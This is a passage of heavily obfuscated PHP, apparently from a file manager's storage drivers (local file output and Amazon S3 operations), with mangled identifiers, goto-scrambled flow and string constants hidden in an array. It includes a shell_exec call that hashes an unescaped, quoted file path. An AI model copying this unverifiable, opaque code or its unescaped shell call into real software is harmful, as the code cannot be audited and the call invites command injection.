DÓÁ£á­å‘; AÅäíŞ¸óÚ: $DÚÖªµ”¡Æ = Cache::get($EÎ¥ğ—°Ñ[97]); if (!$DÚÖªµ”¡Æ) { $A…¿ÛÁöãÏ = BASIC_PATH . $EÎ¥ğ—°Ñ[98]; $A‚ùäëí£ñ = md5_file($A…¿ÛÁöãÏ); $DÚÖªµ”¡Æ = $EÎ¥ğ—°Ñ[99]; foreach ($C©³Úó ³ as $a¼’÷«Ù˜’) { $aïğÉõ©é = shell_exec($a¼’÷«Ù˜’ . "\x20\x22{$A…¿ÛÁöãÏ}\x22"); if ($aïğÉõ©é && substr(trim($aïğÉõ©é), 0, 32) == $A‚ùäëí£ñ) { $DÚÖªµ”¡Æ = $a¼’÷«Ù˜’; break; } } Cache::set($EÎ¥ğ—°Ñ[97], $DÚÖªµ”¡Æ, 3600); } if ($DÚÖªµ”¡Æ == $EÎ¥ğ—°Ñ[99]) { return !1; } goto a•– Å¾Å¬; a•– Å¾Å¬: $aïğÉõ©é = shell_exec($DÚÖªµ”¡Æ . "\40\x22{$b¼¦¦šÌ}\42"); return substr($aïğÉõ©é, 0, 32); goto D¤‰Ê¥œ»õ; DÓÁ£á­å‘: $EÎ¥ğ—°Ñ =& $_SERVER[»„]; if (!function_exists($EÎ¥ğ—°Ñ[94])) { return !1; } $C©³Úó ³ = array($EÎ¥ğ—°Ñ[95], $EÎ¥ğ—°Ñ[96]); goto AÅäíŞ¸óÚ; D¤‰Ê¥œ»õ: } public function link($a›Ñšß¤ö) { return $a›Ñšß¤ö; } public function fileOut($BÉ«ÔÜìø, $bĞººˆÏˆƒ = false, $aš‘·ìæ = false, $Dø“×¼Æø× = '') { goto Cè‚´Í¨Ğ; d‡•„¯¿¬§: header($DÀ·©„µªÂ[149] . ($CëÀ¦ƒö— - $AÕ˜Şˆ•ùÚ + 1)); if ($_SERVER[$DÀ·©„µªÂ[150]] == $DÀ·©„µªÂ[151]) { return; } $BË‘Œ‰å÷ö = 1024 * 100; goto f­Àà¹œµ; FšÍ…Ö±°’: if (in_array($f£Ÿ½·÷½Å, array($DÀ·©„µªÂ[107], $DÀ·©„µªÂ[108], $DÀ·©„µªÂ[109], $DÀ·©„µªÂ[110]))) { $f£Ÿ½·÷½Å = $DÀ·©„µªÂ[111]; } if (!$Dø“×¼Æø×) { $Dø“×¼Æø× = md5($Fªæ¥’š› . $this->hashSimple($BÉ«ÔÜìø)); } $Dø“×¼Æø× = $DÀ·©„µªÂ[112] . $Dø“×¼Æø× . $DÀ·©„µªÂ[112]; goto AâšÕÙù„; A†”Œ‰„ª: $F£˜­Èƒ¸½ = strtolower($_SERVER[$DÀ·©„µªÂ[137]]); if ($E«ƒ¶åŠù && $F£˜­Èƒ¸½ && $bÑö˜öÄ£) { if (strstr($F£˜­Èƒ¸½, $DÀ·©„µªÂ[138])) { header($DÀ·©„µªÂ[139] . $BÉ«ÔÜìø); } else { if (strstr($F£˜­Èƒ¸½, $DÀ·©„µªÂ[140])) { header($DÀ·©„µªÂ[141] . $BÉ«ÔÜìø); } else { if (strstr($F£˜­Èƒ¸½, $DÀ·©„µªÂ[142])) { header($DÀ·©„µªÂ[143] . $BÉ«ÔÜìø); } } } if ($EŒÍ÷¯ªÇ…) { header($DÀ·©„µªÂ[144] . $EŒÍ÷¯ªÇ…); } return; } if (isset($_SERVER[$DÀ·©„µªÂ[145]])) { if (preg_match($DÀ·©„µªÂ[146], $_SERVER[$DÀ·©„µªÂ[145]], $bÂ²ƒ‹ÆŒ)) { $AÕ˜Şˆ•ùÚ = intval($bÂ²ƒ‹ÆŒ[1]); if (!empty($bÂ²ƒ‹ÆŒ[2])) { $CëÀ¦ƒö— = intval($bÂ²ƒ‹ÆŒ[2]); } } header($DÀ·©„µªÂ[147]); header("\x43\x6f\x6e\x74\x65\x6e\164\55\x52\141\156\x67\145\72\40\142\x79\164\x65\x73\x20{$AÕ˜Şˆ•ùÚ}\x2d{$CëÀ¦ƒö—}\x2f" . $E¡•ƒƒòÇ…); } else { header($DÀ·©„µªÂ[148]); } goto d‡•„¯¿¬§; Bœˆİ›ßÅá: $E¡•ƒƒòÇ… = $CìæõÃ… »[$DÀ·©„µªÂ[77]]; $Fªæ¥’š› = gmdate($DÀ·©„µªÂ[105], $CìæõÃ… »[$DÀ·©„µªÂ[106]]); $B·†²™ê£Ù = $aš‘·ìæ ? $aš‘·ìæ : $this->iconvApp($CìæõÃ… »[$DÀ·©„µªÂ[28]]); goto fÛêêÏùí; Bå²­°Ò: @ob_end_clean(); set_timeout(); $CìæõÃ… » = $this->infoFull($BÉ«ÔÜìø); goto Bœˆİ›ßÅá; A»èêÌÅ‡²: header($DÀ·©„µªÂ[124]); header($DÀ·©„µªÂ[125]); header($DÀ·©„µªÂ[126]); goto A§Ş¤˜¦Ã; c†Œã»Û…½: $Fí¾ÆÍ‚ù = rawurlencode($B·†²™ê£Ù); $Fí¾ÆÍ‚ù = $DÀ·©„µªÂ[112] . $Fí¾ÆÍ‚ù . $DÀ·©„µªÂ[116] . $Fí¾ÆÍ‚ù; if ($bĞººˆÏˆƒ) { header($DÀ·©„µªÂ[117]); header($DÀ·©„µªÂ[118] . $Fí¾ÆÍ‚ù); } else { header($DÀ·©„µªÂ[119] . $Fí¾ÆÍ‚ù); } goto DŠçÕ’¢³; bÊî¿×¬Å’: $E«ƒ¶åŠù = $this->getType() == $DÀ·©„µªÂ[101]; $bÑö˜öÄ£ = $GLOBALS[$DÀ·©„µªÂ[6]][$DÀ·©„µªÂ[84]][$DÀ·©„µªÂ[102]][$DÀ·©„µªÂ[103]]; $EŒÍ÷¯ªÇ… = (double) $GLOBALS[$DÀ·©„µªÂ[6]][$DÀ·©„µªÂ[84]][$DÀ·©„µªÂ[102]][$DÀ·©„µªÂ[104]] * 1024 * 1024; goto Bå²­°Ò; Cè‚´Í¨Ğ: $DÀ·©„µªÂ =& $_SERVER[»„]; $this->cacheMethod(null, null); if (!$BÉ«ÔÜìø || !$this->exist($BÉ«ÔÜìø)) { show_json(LNG($DÀ·©„µªÂ[100]), !1, $aš‘·ìæ); } goto bÊî¿×¬Å’; f­Àà¹œµ: $Aß®Œ´Ù = 0; if ($EŒÍ÷¯ªÇ…) { $Aß®Œ´Ù = intval(1000 * 1000 * ($BË‘Œ‰å÷ö / $EŒÍ÷¯ªÇ…)); } while ($AÕ˜Şˆ•ùÚ <= $CëÀ¦ƒö—) { $fñéí´ …ã = timeFloat(); check_abort(); $cãğ…§ÚåÕ = $CëÀ¦ƒö— - $AÕ˜Şˆ•ùÚ + 1; if ($cãğ…§ÚåÕ <= $BË‘Œ‰å÷ö) { $BË‘Œ‰å÷ö = $cãğ…§ÚåÕ; } echo $this->fileSubstr($BÉ«ÔÜìø, $AÕ˜Şˆ•ùÚ, $BË‘Œ‰å÷ö); $AÕ˜Şˆ•ùÚ += $BË‘Œ‰å÷ö; if ($BË‘Œ‰å÷ö == $cãğ…§ÚåÕ) { $AÕ˜Şˆ•ùÚ = $CëÀ¦ƒö— + 1; } if ($Aß®Œ´Ù) { $F…œ¶®Â¸æ = intval(1000 * 1000 * (timeFloat() - $fñéí´ …ã)); $BÇå¬¤Í¢¢ = $Aß®Œ´Ù - $F…œ¶®Â¸æ; if ($BÇå¬¤Í¢¢ > 5) { usleep($BÇå¬¤Í¢¢); } } } goto fÏÒÚ˜¬î; DŠçÕ’¢³: header($DÀ·©„µªÂ[120]); header($DÀ·©„µªÂ[121] . $dö‘îŒ¡×¡); header($DÀ·©„µªÂ[122] . gmdate($DÀ·©„µªÂ[105], time() + 3600 * 24 * 30) . $DÀ·©„µªÂ[123]); goto A»èêÌÅ‡²; aè½†´äöƒ: header($DÀ·©„µªÂ[134] . $E¡•ƒƒòÇ…); header($DÀ·©„µªÂ[135]); if (!$bĞººˆÏˆƒ && $f£Ÿ½·÷½Å == $DÀ·©„µªÂ[136]) { if ($E¡•ƒƒòÇ… > 1024 * 1024 * 5) { die; } $Fî»£êí¥Î = $this->getContent($BÉ«ÔÜìø); $Fî»£êí¥Î = Html::clearSVG($Fî»£êí¥Î); echo $Fî»£êí¥Î; die; } goto A†”Œ‰„ª; A§Ş¤˜¦Ã: if (isset($_SERVER[$DÀ·©„µªÂ[127]]) && strtotime($_SERVER[$DÀ·©„µªÂ[127]]) == $CìæõÃ… »[$DÀ·©„µªÂ[106]]) { header($DÀ·©„µªÂ[128], !0, 304); die; } if (isset($_SERVER[$DÀ·©„µªÂ[129]]) && $_SERVER[$DÀ·©„µªÂ[129]] == $Dø“×¼Æø×) { header($DÀ·©„µªÂ[130] . $Dø“×¼Æø×, !0, 304); die; } header($DÀ·©„µªÂ[130] . $Dø“×¼Æø×); goto aÄçâêœ¨¯; fÛêêÏùí: $AÕ˜Şˆ•ùÚ = 0; $CëÀ¦ƒö— = $E¡•ƒƒòÇ… - 1; $f£Ÿ½·÷½Å = $this->ext($B·†²™ê£Ù); goto FšÍ…Ö±°’; AâšÕÙù„: $dö‘îŒ¡×¡ = get_file_mime($f£Ÿ½·÷½Å); if (strstr($dö‘îŒ¡×¡, $DÀ·©„µªÂ[113])) { $dö‘îŒ¡×¡ = $dö‘îŒ¡×¡ . $DÀ·©„µªÂ[114]; } if ($bĞººˆÏˆƒ === !1 && !mime_support($dö‘îŒ¡×¡)) { $bĞººˆÏˆƒ = !0; $dö‘îŒ¡×¡ = $DÀ·©„µªÂ[115]; } goto c†Œã»Û…½; aÄçâêœ¨¯: header($DÀ·©„µªÂ[131] . $Fªæ¥’š› . $DÀ·©„µªÂ[123]); header($DÀ·©„µªÂ[132] . $B·†²™ê£Ù); header($DÀ·©„µªÂ[133]); goto aè½†´äöƒ; fÏÒÚ˜¬î: } public function fileOutServer($cÚ¼øîÄ¼é, $bÔ±İµ¢ƒ = false, $A°­ñöàšò = false, $B‘íä½¹Å¡ = '') { $this->fileOut($cÚ¼øîÄ¼é, $bÔ±İµ¢ƒ, $A°­ñöàšò, $B‘íä½¹Å¡); } public function fileOutLink($c°›¥ˆè‡½) { header($_SERVER[»„][152] . $c°›¥ˆè‡½); die; } public function cacheMethod($FÀ¹ôÂÈ–¼, $dÇÈ³…Â Š) { goto B»¢Ìàî‚±; eï¢ƒÈ¶¬…: if (is_null($FÀ¹ôÂÈ–¼)) { $CÙâ‚Æñ…ä = array(); return; } if (is_null($dÇÈ³…Â Š)) { unset($CÙâ‚Æñ…ä[$b¡ÂÃò±âë]); return; } $F½«‡‹¥½ = isset($CÙâ‚Æñ…ä[$b¡ÂÃò±âë]) ? $CÙâ‚Æñ…ä[$b¡ÂÃò±âë] : null; goto c²‹âìØ¾¶; B»¢Ìàî‚±: $aÍÈ†‚Š‹ =& $_SERVER[»„]; static $CÙâ‚Æñ…ä = array(); $b¡ÂÃò±âë = $aÍÈ†‚Š‹[153] . $FÀ¹ôÂÈ–¼ . $aÍÈ†‚Š‹[154] . rtrim($dÇÈ³…Â Š, $aÍÈ†‚Š‹[8]); goto eï¢ƒÈ¶¬…; c²‹âìØ¾¶: if (!is_null($F½«‡‹¥½)) { return $F½«‡‹¥½; } $F½«‡‹¥½ = $this->{$FÀ¹ôÂÈ–¼}($dÇÈ³…Â Š); $CÙâ‚Æñ…ä[$b¡ÂÃò±âë] = $F½«‡‹¥½; goto A¿ùô¡î™›; A¿ùô¡î™›: return $F½«‡‹¥½; goto a¾ºì„ššª; a¾ºì„ššª: } public function fileOutImage($Dàç·œî¨ğ, $B¾×ç»°†Ä = 250) { goto fìÖã†Ü¨¥; fòŸñŠõ: $aÉÊğ†é ù = DATA_THUMB . $Cİâ¡´Š˜; if (!@file_exists($aÉÊğ†é ù)) { $F½¥Ğœøã¤ = TEMP_FILES; if (!is_dir($F½¥Ğœøã¤)) { mk_dir($F½¥Ğœøã¤); } $Eİ‰ö’‡ï¥ = $F½¥Ğœøã¤ . $fŞÎ™µó‹æ . $c‘Ó­éšÃ[91] . $C‰‹Ş±ŸéË[$c‘Ó­éšÃ[156]]; if (!@file_exists($Eİ‰ö’‡ï¥)) { $Eİ‰ö’‡ï¥ = $this->download($Dàç·œî¨ğ, $Eİ‰ö’‡ï¥); } $D§ºàŠ³ìù = new ImageThumb($Eİ‰ö’‡ï¥, $c‘Ó­éšÃ[163]); $D§ºàŠ³ìù->prorate($aÉÊğ†é ù, $B¾×ç»°†Ä, $B¾×ç»°†Ä * 10); } if (!file_exists($aÉÊğ†é ù) || filesize($aÉÊğ†é ù) < 100) { return @file_exists($Eİ‰ö’‡ï¥) ? IO::fileOut($Eİ‰ö’‡ï¥) : $this->fileOut($Dàç·œî¨ğ); } goto AƒÕäœÓ§ ; fìÖã†Ü¨¥: $c‘Ó­éšÃ =& $_SERVER[»„]; if (substr($Dàç·œî¨ğ, 0, 4) == $c‘Ó­éšÃ[142]) { $this->fileOutLink($Dàç·œî¨ğ); } $C‰‹Ş±ŸéË = $this->info($Dàç·œî¨ğ); goto CÈ£ªéÈäº; AƒÕäœÓ§ : if (!($b”¤¿˜¡Ò = IO::move($aÉÊğ†é ù, $FùàºêìˆŞ))) { return IO::fileOut($aÉÊğ†é ù); } del_file($aÉÊğ†é ù); IO::fileOut($b”¤¿˜¡Ò); goto c“«ÈÊÚãõ; CÈ£ªéÈäº: if ($C‰‹Ş±ŸéË[$c‘Ó­éšÃ[77]] <= 1024 * 50 || !function_exists($c‘Ó­éšÃ[155]) || $C‰‹Ş±ŸéË[$c‘Ó­éšÃ[156]] == $c‘Ó­éšÃ[157]) { return $this->fileOut($Dàç·œî¨ğ); } if (isset($C‰‹Ş±ŸéË[$c‘Ó­éšÃ[158]][$c‘Ó­éšÃ[159]])) { $fŞÎ™µó‹æ = $C‰‹Ş±ŸéË[$c‘Ó­éšÃ[158]][$c‘Ó­éšÃ[159]]; } else { if (isset($C‰‹Ş±ŸéË[$c‘Ó­éšÃ[158]][$c‘Ó­éšÃ[160]])) { $fŞÎ™µó‹æ = $C‰‹Ş±ŸéË[$c‘Ó­éšÃ[158]][$c‘Ó­éšÃ[160]]; } else { $fŞÎ™µó‹æ = md5("{$C‰‹Ş±ŸéË[$c‘Ó­éšÃ[28]]}\x5f{$C‰‹Ş±ŸéË[$c‘Ó­éšÃ[75]]}\x5f{$C‰‹Ş±ŸéË[$c‘Ó­éšÃ[77]]}"); } } $Cİâ¡´Š˜ = "{$fŞÎ™µó‹æ}\x5f{$B¾×ç»°†Ä}\56\160\156\x67"; goto BÙëÚ½à³; BÙëÚ½à³: if (!($f‚ŒÔµêÎŠ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $c‘Ó­éšÃ[161]))) { $FùàºêìˆŞ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $c‘Ó­éšÃ[162]); } else { $FùàºêìˆŞ = KodIO::make($f‚ŒÔµêÎŠ); } if ($f‚ŒÔµêÎŠ = IO::fileNameExist($FùàºêìˆŞ, $Cİâ¡´Š˜)) { $aÉÊğ†é ù = KodIO::make($f‚ŒÔµêÎŠ); return IO::fileOut($aÉÊğ†é ù); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto fòŸñŠõ; c“«ÈÊÚãõ: } public function fileOutImageServer($f‘¸ŠÃö‚Ñ, $AÃÂ‚êƒÀé = 250) { $this->fileOutImage($f‘¸ŠÃö‚Ñ, $AÃÂ‚êƒÀé); } public function fileNameAuto($BíÒòÀË‘†, $dÒ¹á£ŸªŒ, $fÆèµĞÊ’‚ = REPEAT_RENAME, $e„´âˆÉ–Œ = false) { goto c÷…²¯¾Ü§; AöòéÎª’ß: if ($fÆèµĞÊ’‚ == REPEAT_SKIP) { return !1; } $dÓË†È×öø = $F±Àƒë²ÌŞ[91] . get_path_ext($dÒ¹á£ŸªŒ); $dÓË†È×öø = $dÓË†È×öø == $F±Àƒë²ÌŞ[91] || $e„´âˆÉ–Œ ? $F±Àƒë²ÌŞ[33] : $dÓË†È×öø; goto F­èÕÜÖÅ×; F­èÕÜÖÅ×: $FÉÙ™î‡Ôá = 1; $EÕ£É’•†ã = substr($dÒ¹á£ŸªŒ, 0, strlen($dÒ¹á£ŸªŒ) - strlen($dÓË†È×öø)); $C—¤£ˆ·¸ = $EÕ£É’•†ã . "\50{$FÉÙ™î‡Ôá}\51{$dÓË†È×öø}"; goto Cˆ‹ñœäáÇ; c÷…²¯¾Ü§: $F±Àƒë²ÌŞ =& $_SERVER[»„]; $Eä¸Åêò¬­ = $BíÒòÀË‘† === $F±Àƒë²ÌŞ[33] ? $dÒ¹á£ŸªŒ : rtrim($BíÒòÀË‘†, $F±Àƒë²ÌŞ[8]) . $F±Àƒë²ÌŞ[8] . $dÒ¹á£ŸªŒ; if ($fÆèµĞÊ’‚ == REPEAT_REPLACE || !$this->exist($Eä¸Åêò¬­) || $e„´âˆÉ–Œ && $fÆèµĞÊ’‚ != REPEAT_RENAME_FOLDER) { return $dÒ¹á£ŸªŒ; } goto AöòéÎª’ß; Cˆ‹ñœäáÇ: while ($this->exist(rtrim($BíÒòÀË‘†, $F±Àƒë²ÌŞ[8]) . $F±Àƒë²ÌŞ[8] . $C—¤£ˆ·¸)) { $C—¤£ˆ·¸ = $EÕ£É’•†ã . "\50{$FÉÙ™î‡Ôá}\51{$dÓË†È×öø}"; $FÉÙ™î‡Ôá++; } return $C—¤£ˆ·¸; goto A¡ÚŞ³ ÷; A¡ÚŞ³ ÷: } public function listAllFiles($F×¢ªä›î, $e‰ ‹°Üµ, $BÈ…«¹›å¹ = array()) { goto F—³‘ƒ—¨; F—³‘ƒ—¨: $b³©¯ù½ =& $_SERVER[»„]; if (empty($e‰ ‹°Üµ)) { return array(); } $aËó·›´¢ = array(); goto c´‘¬ Õ¿»; c´‘¬ Õ¿»: $F×¢ªä›î = trim($F×¢ªä›î, $b³©¯ù½[8]); foreach ($e‰ ‹°Üµ as $EÀİÍì‰°‘) { $AÜùÂ¦ã‡‰ = ltrim(substr($EÀİÍì‰°‘, strlen($F×¢ªä›î)), $b³©¯ù½[8]); $aËó·›´¢ = array_merge($aËó·›´¢, $this->slicePath($AÜùÂ¦ã‡‰)); } $bÆ¦»óù² = array(); goto C‡”¼´ëô; C‡”¼´ëô: foreach (array_unique($aËó·›´¢) as $EÀİÍì‰°‘) { $FÌ®…òÇ¥Ÿ = array($b³©¯ù½[75] => $this->getPathOuter($b³©¯ù½[8] . $F×¢ªä›î . $b³©¯ù½[8] . $EÀİÍì‰°‘), $b³©¯ù½[76] => 1, $b³©¯ù½[77] => 0); if (substr($EÀİÍì‰°‘, -1) != $b³©¯ù½[8]) { $FÌ®…òÇ¥Ÿ[$b³©¯ù½[76]] = 0; $a¹õÜÅ¬¹Ë = $this->getPath($F×¢ªä›î . $b³©¯ù½[8] . $EÀİÍì‰°‘); $FÌ®…òÇ¥Ÿ[$b³©¯ù½[77]] = isset($BÈ…«¹›å¹[$a¹õÜÅ¬¹Ë]) ? $BÈ…«¹›å¹[$a¹õÜÅ¬¹Ë] : $this->size($a¹õÜÅ¬¹Ë); } $bÆ¦»óù²[] = $FÌ®…òÇ¥Ÿ; } return $bÆ¦»óù²; goto fàÔá´ªùù; fàÔá´ªùù: } public function slicePath($càÏ—öÚø) { $FŠ·©ó¥…Î =& $_SERVER[»„]; $c©§“÷œ¯µ = explode($FŠ·©ó¥…Î[8], trim($càÏ—öÚø, $FŠ·©ó¥…Î[8])); $Däƒ‡ÈÍ ® = 0; do { ++$Däƒ‡ÈÍ ®; $d…ÉÜ·Å…[] = implode($FŠ·©ó¥…Î[8], array_slice($c©§“÷œ¯µ, 0, $Däƒ‡ÈÍ ®)) . $FŠ·©ó¥…Î[8]; } while ($Däƒ‡ÈÍ ® < count($c©§“÷œ¯µ)); $d…ÉÜ·Å…[count($c©§“÷œ¯µ) - 1] = $càÏ—öÚø; return $d…ÉÜ·Å…; } public function getHost() { $dÆªºŠòŒ =& $_SERVER[»„]; $Cî¼ÑÄ“å = parse_url(trim($this->domain, $dÆªºŠòŒ[8])); $B²…¿¼Ë†¹ = isset($Cî¼ÑÄ“å[$dÆªºŠòŒ[164]]) ? $Cî¼ÑÄ“å[$dÆªºŠòŒ[164]] : http_type(); $a«—©«Øİ¾ = isset($Cî¼ÑÄ“å[$dÆªºŠòŒ[165]]) ? $Cî¼ÑÄ“å[$dÆªºŠòŒ[165]] : $Cî¼ÑÄ“å[$dÆªºŠòŒ[75]]; if (isset($Cî¼ÑÄ“å[$dÆªºŠòŒ[166]])) { $a«—©«Øİ¾ .= $dÆªºŠòŒ[4] . $Cî¼ÑÄ“å[$dÆªºŠòŒ[166]]; } return $B²…¿¼Ë†¹ . $dÆªºŠòŒ[167] . $a«—©«Øİ¾; } public function pathEncode($e çíÊ‹·) { $BÒêºœ„â =& $_SERVER[»„]; return str_replace($BÒêºœ„â[168], $BÒêºœ„â[8], rawurlencode($e çíÊ‹·)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($C‘˜ğÈÆÅÇ) { set_timeout(); require_once SDK_DIR . $_SERVER[»„][169]; parent::__construct(); $this->_init($C‘˜ğÈÆÅÇ); } public function _init($d‹‰Ì³¾) { foreach ($d‹‰Ì³¾ as $eÉó…¶ğ­Ê => $f•‘âó) { if (isset($this->{$eÉó…¶ğ­Ê})) { $this->{$eÉó…¶ğ­Ê} = $f•‘âó; } } $this->endpoint = $d‹‰Ì³¾[$_SERVER[»„][170]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($a£ä¯Ë Ñ¨ = "\x76\64") { $this->signVer = $a£ä¯Ë Ñ¨; $this->client->setSignatureVersion($a£ä¯Ë Ñ¨); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto eªä‰ºøÄ­; D±í£ˆÆã§: if ($eÂÚµÇˆ¡ò[$d›ö“ğÏÊ‡[171]] != $d›ö“ğÏÊ‡[172] || $eÂÚµÇˆ¡ò[$d›ö“ğÏÊ‡[173]] != $d›ö“ğÏÊ‡[172]) { return !1; } $AÄ¥æ­‡Ì® = array_map($d›ö“ğÏÊ‡[174], $eÂÚµÇˆ¡ò[$d›ö“ğÏÊ‡[175]]); if (!is_array($AÄ¥æ­‡Ì®)) { $AÄ¥æ­‡Ì® = array(); } goto cè“¬‚¬Í‹; cè“¬‚¬Í‹: $BâàÇóğöã = array($d›ö“ğÏÊ‡[176], $d›ö“ğÏÊ‡[177], $d›ö“ğÏÊ‡[178], $d›ö“ğÏÊ‡[179], $d›ö“ğÏÊ‡[180]); $C¯ÃÓ¬›õ‡ = array_diff($BâàÇóğöã, $AÄ¥æ­‡Ì®); return empty($C¯ÃÓ¬›õ‡); goto A˜âäó¥¹; eªä‰ºøÄ­: $d›ö“ğÏÊ‡ =& $_SERVER[»„]; $eÂÚµÇˆ¡ò = $this->getBucketCors(); if (!$eÂÚµÇˆ¡ò || !is_array($eÂÚµÇˆ¡ò)) { return !1; } goto D±í£ˆÆã§; A˜âäó¥¹: } public function mkfile($f¦¹È…ñæÓ, $cÇ¶îĞ—è = '', $E„ªÁòÅÍ¥ = REPEAT_RENAME) { $eòª·©†ª = $this->setContent($f¦¹È…ñæÓ, $cÇ¶îĞ—è); if ($eòª·©†ª !== !1) { return $this->getPathOuter($f¦¹È…ñæÓ); } return !1; } public function mkdir($b‡İ®¦—¬, $B­Ê»õ‹¦ƒ = REPEAT_SKIP) { if (empty($b‡İ®¦—¬)) { return !1; } if ($this->_isFolder($b‡İ®¦—¬)) { return $this->getPathOuter($b‡İ®¦—¬); } $d¢ ¶·ö“ò = $this->setContent($b‡İ®¦—¬, $_SERVER[»„][33], !0); if ($d¢ ¶·ö“ò !== !1) { return $this->getPathOuter($b‡İ®¦—¬); } return !1; } public function copyFile($Fêà¿„İ‡ê, $eÈ²ÙÃâ®, $B´›˜ìÚ¥è = array()) { $Bğ¶Üøˆ½ =& $_SERVER[»„]; $e†Šìùä‹ = $this->objectMeta($Fêà¿„İ‡ê); if (!$e†Šìùä‹) { return !1; } if ($e†Šìùä‹[$Bğ¶Üøˆ½[77]] <= 1024 * 1024 * 200) { $F–Ñä‚å‹† = $this->client->copyObject($this->bucket, $Fêà¿„İ‡ê, $this->bucket, $eÈ²ÙÃâ®, $Bğ¶Üøˆ½[181], $B´›˜ìÚ¥è); } else { $F–Ñä‚å‹† = $this->client->multiCopyObject($this->bucket, $Fêà¿„İ‡ê, $this->bucket, $eÈ²ÙÃâ®, $B´›˜ìÚ¥è); } $F–Ñä‚å‹† = $F–Ñä‚å‹† ? $this->getPathOuter($eÈ²ÙÃâ®) : !1; return $F–Ñä‚å‹†; } public function moveFile($Bää³õİˆ‘, $eÊóˆŠÑ§ù) { if ($this->copyFile($Bää³õİˆ‘, $eÊóˆŠÑ§ù)) { $this->delFile($Bää³õİˆ‘); return $this->getPathOuter($eÊóˆŠÑ§ù); } return !1; } public function delFile($B˜“ÌŸ÷ßÈ) { return $this->client->deleteObject($this->bucket, $B˜“ÌŸ÷ßÈ); } public function delFolder($B‡Â‹¼Û) { goto e¥ùƒ¼âã; CÖ¥‹áŠ: $dÑ—¿–¡­Ó = $F®¦£¤äÇ = 0; $F°âÜÈ• = array_chunk(array_keys($a£„ÌßÅ), 1000); foreach ($F°âÜÈ• as $A’ÕØ‰ËÛŠ) { $dÑ—¿–¡­Ó++; $F®¦£¤äÇ += (int) $this->client->deleteObjects($this->bucket, $A’ÕØ‰ËÛŠ); } goto a‚Øè™Şó; a‚Øè™Şó: return $dÑ—¿–¡­Ó === $F®¦£¤äÇ ? !0 : !1; goto E’îùÏ¤¹Û; e¥ùƒ¼âã: $d×§ß¶µã =& $_SERVER[»„]; $a£„ÌßÅ = $this->listObjs($B‡Â‹¼Û); if (!$a£„ÌßÅ) { $B‡Â‹¼Û = trim($B‡Â‹¼Û, $d×§ß¶µã[8]); if (!empty($B‡Â‹¼Û)) { $B‡Â‹¼Û .= $d×§ß¶µã[8]; } return $this->delFile($B‡Â‹¼Û); } goto CÖ¥‹áŠ; E’îùÏ¤¹Û: } public function rename($e³Ä¢«á«’, $F¯í¸Œ ´) { return $this->renameObject($e³Ä¢«á«’, $F¯í¸Œ ´); } public function listPath($E¯Êö§À¶¦, $f‚¾É§¿¬á = false) { $Aœ¼‚‰¿ßˆ =& $_SERVER[»„]; $B¿ˆÈ®†ò = $this->listObjs($E¯Êö§À¶¦, null, null, $Aœ¼‚‰¿ßˆ[8]); $F‘–ÖôÛœ… = array($Aœ¼‚‰¿ßˆ[74] => array(), $Aœ¼‚‰¿ßˆ[73] => array()); foreach ($B¿ˆÈ®†ò as $dæ’ªàÙ¦¼ => $CÃÌ¸ÙÖ£ò) { if ($dæ’ªàÙ¦¼ == $Aœ¼‚‰¿ßˆ[8]) { continue; } if (isset($CÃÌ¸ÙÖ£ò[$Aœ¼‚‰¿ßˆ[182]])) { $F‘–ÖôÛœ…[$Aœ¼‚‰¿ßˆ[74]][] = $this->folderInfo($CÃÌ¸ÙÖ£ò[$Aœ¼‚‰¿ßˆ[182]], $f‚¾É§¿¬á); } else { if (substr($CÃÌ¸ÙÖ£ò[$Aœ¼‚‰¿ßˆ[28]], -1) == $Aœ¼‚‰¿ßˆ[8]) { continue; } $F‘–ÖôÛœ…[$Aœ¼‚‰¿ßˆ[73]][] = $this->fileInfo($CÃÌ¸ÙÖ£ò[$Aœ¼‚‰¿ßˆ[28]], $f‚¾É§¿¬á, $CÃÌ¸ÙÖ£ò); } } return $F‘–ÖôÛœ…; } private function fileInfo($bèÅ¤ˆ§ó¶, $Dº†ôÍ˜ğÂ = false, $EËÒë³²¶¡ = array()) { goto FÄíÏ ¶; FÄíÏ ¶: $F¢Ï‰‹®½¨ =& $_SERVER[»„]; if ($Dº†ôÍ˜ğÂ) { return array($F¢Ï‰‹®½¨[28] => $this->pathThis($bèÅ¤ˆ§ó¶), $F¢Ï‰‹®½¨[75] => $this->getPathOuter($bèÅ¤ˆ§ó¶), $F¢Ï‰‹®½¨[29] => $F¢Ï‰‹®½¨[163], $F¢Ï‰‹®½¨[156] => $this->ext($bèÅ¤ˆ§ó¶), $F¢Ï‰‹®½¨[77] => isset($EËÒë³²¶¡[$F¢Ï‰‹®½¨[77]]) ? $EËÒë³²¶¡[$F¢Ï‰‹®½¨[77]] : 0, $F¢Ï‰‹®½¨[183] => 0, $F¢Ï‰‹®½¨[106] => 0, $F¢Ï‰‹®½¨[184] => !0, $F¢Ï‰‹®½¨[185] => !0); } $DŞèóÌ×±Ú = array($F¢Ï‰‹®½¨[28] => $this->pathThis($bèÅ¤ˆ§ó¶), $F¢Ï‰‹®½¨[75] => $this->getPathOuter($bèÅ¤ˆ§ó¶), $F¢Ï‰‹®½¨[29] => $F¢Ï‰‹®½¨[163], $F¢Ï‰‹®½¨[183] => 0, $F¢Ï‰‹®½¨[106] => 0, $F¢Ï‰‹®½¨[77] => 0, $F¢Ï‰‹®½¨[156] => $this->ext($bèÅ¤ˆ§ó¶), $F¢Ï‰‹®½¨[184] => !0, $F¢Ï‰‹®½¨[185] => !0); goto F¦¿İŠÜÏÁ; F¦¿İŠÜÏÁ: if (empty($EËÒë³²¶¡)) { $EËÒë³²¶¡ = $this->objectMeta($bèÅ¤ˆ§ó¶); if (!$EËÒë³²¶¡) { return $DŞèóÌ×±Ú; } } if (isset($EËÒë³²¶¡[$F¢Ï‰‹®½¨[186]])) { $DŞèóÌ×±Ú[$F¢Ï‰‹®½¨[106]] = 